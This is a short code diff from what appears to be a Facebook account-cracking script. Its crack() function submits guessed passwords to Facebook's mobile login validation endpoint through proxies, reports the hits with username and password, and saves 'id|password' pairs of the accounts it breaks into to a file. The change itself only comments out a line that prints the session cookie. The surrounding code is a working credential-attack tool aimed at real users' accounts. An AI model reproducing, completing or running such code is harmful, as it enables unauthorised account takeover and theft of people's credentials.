@@ -623,7 +623,7 @@ def crack(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				print('\r%sOK %s               \n└─── Username : %s\n  └── Password : %s%s'%(H,waktu,user,pw,N))
-                print(f'\r{H}Cookie   : {coki}\n')
+#                print(f'\r{H}Cookie   : {coki}\n')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 #   os.system("play-audio cp.mp3")
 				akun.append(idf+'|'+pw)
